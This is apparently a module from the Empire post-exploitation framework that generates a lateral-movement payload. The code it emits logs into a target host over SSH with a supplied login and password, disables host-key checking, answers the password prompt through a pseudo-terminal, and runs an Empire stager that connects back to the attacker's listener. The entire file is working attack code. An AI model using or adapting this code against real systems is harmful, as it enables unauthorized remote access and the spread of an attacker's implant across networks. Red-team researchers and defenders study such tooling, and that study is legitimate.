from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        login = params["Login"]
        password = params["Password"]
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        safe_checks = params["SafeChecks"]

        # generate the launcher code
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="python",
            user_agent=user_agent,
            safe_checks=safe_checks,
        )
        launcher = launcher.replace("'", "\\'")
        launcher = launcher.replace('"', '\\"')
        if launcher == "":
            raise ModuleValidationException("Error in launcher command generation.")
        return f"""
import os
import pty

def wall(host, pw):
    import os,pty
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp('ssh', ['ssh', '-o StrictHostKeyChecking=no', host, '{launcher}'])
        os._exit(1)

    os.read(fd, 1024)
    os.write(fd, '\\n' + pw + '\\n')

    result = []
    while True:
        try:
            data = os.read(fd, 1024)
            if data[:8] == "Password" and data[-1:] == ":":
                os.write(fd, pw + '\\n')

        except OSError:
            break
        if not data:
            break
        result.append(data)
    pid, status = os.waitpid(pid, 0)
    return status, ''.join(result)

status, output = wall('{login}','{password}')
print(status)
print(output)

"""
